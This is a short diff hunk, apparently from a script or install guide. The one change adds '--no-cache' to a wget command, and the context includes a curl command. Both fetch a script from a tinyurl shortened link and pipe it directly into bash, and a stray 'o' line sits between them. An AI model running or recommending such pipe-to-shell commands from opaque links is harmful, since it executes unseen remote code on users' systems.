@@ -4,4 +4,4 @@ curl -fsSL https://tinyurl.com/y2y5b6x7 | bash
 
 o
 
-wget -qO- https://tinyurl.com/y2y5b6x7 | bash
+wget --no-cache -qO- https://tinyurl.com/y2y5b6x7 | bash
